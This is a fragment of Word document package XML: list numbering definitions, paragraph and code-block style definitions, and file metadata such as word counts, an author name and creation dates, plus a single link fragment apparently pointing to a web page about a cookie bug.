      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="A0C08FBA">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="8" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="00000009"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000009"/>
    <w:lvl w:ilvl="0" w:tplc="40E4DB4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A3807E0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="66D68276">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="6EC630E4">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="06622240">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="6C709B18">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="78B4F572">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="C560AD82">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="C4602906">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="9" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="0000000A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0000000A"/>
    <w:lvl w:ilvl="0" w:tplc="8DBC09C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FA6D086">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="3E26CC4E">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="49C67E8E">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="9B8E12D4">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="B642ACCA">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="4C025D88">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="AFD2B3B6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="C55254E2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="10" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="0000000B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0000000B"/>
    <w:lvl w:ilvl="0" w:tplc="21B6C1C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E264A64">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="481EFD2A">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="D9EA9372">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="FABCA090">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="638A09EA">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="C436DA3A">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="65D86904">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="5FC6CD5E">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="11" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="0000000C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0000000C"/>
    <w:lvl w:ilvl="0" w:tplc="54A254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ECEE738">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="FAAE8370">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="C49C170C">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="AAB6B98E">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="FB4E673A">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="AA1EDBE0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="E1A87118">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="2392086A">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="12" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="0000000D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0000000D"/>
    <w:lvl w:ilvl="0" w:tplc="AD58844C">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=" "/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="EEFCCFEE">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=" 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665A1D9A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=" 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0520FA12">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=" 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22081386">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=" 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83D28B2A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=" 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5F98AED4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=" 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9582328E">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=" 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E3C6D9AA">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=" 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3" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="0000000E"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0000000E"/>
    <w:lvl w:ilvl="0" w:tplc="CC94C5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49AEB06">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="FA32F884">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="890E5324">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="FF3A1D68">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="8E4A19C2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="986CE70C">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="612407BA">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="B262CD9A">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="14" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="00266D62"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0C764F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90D42C9"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="D6644A8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F8A18D5"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="CA0808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noPunctuationKerning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2119"/>
    <w:rsid w:val="001F2156"/>
    <w:rsid w:val="006B21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6DA03"/>
  <w15:docId w15:val="{4ED7146E-B11D-43EC-AF2F-7DE354D06F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5BCE"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading1">
    <w:name w:val="heading 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading1Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="001F21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encedCode">
    <w:name w:val="FencedCode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customStyle="1" w:styleId="InlineCode">
    <w:name w:val="InlineCode"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
      <w:color w:val="C7254E"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:highlight w:val="white"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="FencedCodejavascript">
    <w:name w:val="FencedCode.javascript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html">
    <w:name w:val="FencedCode.html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paragraph" w:customStyle="1" w:styleId="FencedCodepython">
    <w:name w:val="FencedCode.python"/>
    <w:pPr>
      <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Hyperlink">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00EF7B96"/>
    <w:rPr>
      <w:color w:val="0000FF"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Quote">
    <w:name w:val="Quote"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="QuoteChar"/>
    <w:uiPriority w:val="29"/>
    <w:qFormat/>
    <w:rsid w:val="00E12ACB"/>
    <w:pPr>
      <w:pBdr>
        <w:left w:val="single" w:sz="18" w:space="0" w:color="9F9F9F"/>
      </w:pBdr>
    </w:pPr>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="000000"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="QuoteChar">
    <w:name w:val="Quote Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Quote"/>
    <w:uiPriority w:val="29"/>
    <w:rsid w:val="00E12ACB"/>
    <w:rPr>
      <w:i/>
      <w:iCs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15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1F215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F2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5036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ankursundara.com/cookie-bug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2451</Words>
  <Characters>13971</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>116</Lines>
  <Paragraphs>32</Paragraphs>
  <ScaleCrop>false</ScaleCrop>
  <Company/>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>16390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Mohamed Ashraf Ismail Saad Ismail</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-05-29T12:40:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-05-29T12:47:00Z</dcterms:modified>
</cp:coreProperties>
</file>